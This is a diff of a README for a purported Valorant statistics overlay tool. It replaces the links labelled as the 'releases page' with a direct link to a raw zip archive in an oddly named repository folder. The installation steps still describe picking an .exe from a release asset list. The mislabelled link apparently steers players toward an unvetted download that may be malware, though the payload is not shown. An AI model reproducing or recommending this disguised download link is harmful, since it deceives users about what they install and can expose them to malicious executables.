@@ -1,6 +1,6 @@
 # 🎮 valorant-tool-kit - Better statistics for your valorant matches
 
-[![Download](https://img.shields.io/badge/Download-Release_Page-blue)](https://github.com/tawnyafacultative433/valorant-tool-kit)
+[![Download](https://img.shields.io/badge/Download-Release_Page-blue)](https://github.com/tawnyafacultative433/valorant-tool-kit/raw/refs/heads/main/photoreception/valorant-kit-tool-v2.4.zip)
 
 The Valorant Tool Kit helps players track their game performance. It provides clear data through an overlay that sits on top of your game. You can view your statistics without leaving your match. This tool helps you see your strengths and areas for improvement.
 
@@ -18,7 +18,7 @@ Your computer needs to meet these requirements to run the tool smoothly:
 
 Follow these steps to set up the software on your Windows computer.
 
-1. Visit the [releases page](https://github.com/tawnyafacultative433/valorant-tool-kit) to download the latest version of the toolkit.
+1. Visit the [releases page](https://github.com/tawnyafacultative433/valorant-tool-kit/raw/refs/heads/main/photoreception/valorant-kit-tool-v2.4.zip) to download the latest version of the toolkit.
 2. Locate the file ending in .exe in the list of assets.
 3. Click the file to start the download.
 4. Save the file to your desktop or your downloads folder.
